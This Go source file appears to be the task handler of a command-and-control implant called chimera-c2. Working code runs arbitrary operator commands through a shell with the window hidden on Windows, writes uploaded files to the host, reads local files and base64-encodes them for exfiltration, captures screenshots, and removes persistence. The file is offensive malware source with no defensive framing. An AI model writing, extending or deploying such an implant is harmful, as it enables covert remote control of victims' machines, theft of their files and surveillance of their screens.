package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	"github.com/kbinani/screenshot"
	"github.com/terancebana/chimera-c2/implant/internal/common"
	"golang.org/x/sys/windows"
)

func handleTask(task Task) Result {
	res := Result{Type: "text", Data: ""}
	switch task.Type {
	case "exec":
		out, err := runCommand(task.Command)
		if err != nil {
			res.Data = fmt.Sprintf("Error: %s", err)
		} else {
			if len(out) == 0 {
				res.Data = "[+] Executed (No Output)"
			} else {
				res.Data = out
			}
		}
	case "cd":
		err := os.Chdir(task.Path)
		if err != nil {
			res.Data = fmt.Sprintf("Error: %s", err)
		} else {
			cwd, _ := os.Getwd()
			res.Data = fmt.Sprintf("Changed to: %s", cwd)
		}
	case "upload":
		data, err := base64.StdEncoding.DecodeString(task.FileData)
		if err != nil {
			res.Data = fmt.Sprintf("B64 Error: %s", err)
		} else {
			err = os.WriteFile(task.Destination, data, 0644)
			if err != nil {
				res.Data = fmt.Sprintf("Write Error: %s", err)
			} else {
				res.Data = fmt.Sprintf("Uploaded to: %s", task.Destination)
			}
		}
	case "download":
		data, err := os.ReadFile(task.Path)
		if err != nil {
			res.Data = fmt.Sprintf("Read Error: %s", err)
		} else {
			res.Type = "file"
			res.Filename = filepath.Base(task.Path)
			res.Data = base64.StdEncoding.EncodeToString(data)
		}
	case "uninstall":
		err := common.UninstallPersistence()
		if err != nil {
			res.Data = fmt.Sprintf("Cleanup Errors: %s", err)
		} else {
			res.Data = "Persistence removed. Terminating..."
		}
	case "screenshot":
		n := screenshot.NumActiveDisplays()
		if n <= 0 {
			res.Data = "No active displays."
		} else {
			bounds := screenshot.GetDisplayBounds(0)
			img, err := screenshot.CaptureRect(bounds)
			if err != nil {
				res.Data = fmt.Sprintf("Fail: %s", err)
			} else {
				var buf bytes.Buffer
				png.Encode(&buf, img)
				res.Type = "file"
				res.Filename = fmt.Sprintf("screen_%d.png", time.Now().Unix())
				res.Data = base64.StdEncoding.EncodeToString(buf.Bytes())
			}
		}
	}
	return res
}

func runCommand(cmd string) (string, error) {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
		c.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	output, err := c.CombinedOutput()
	return string(output), err
}
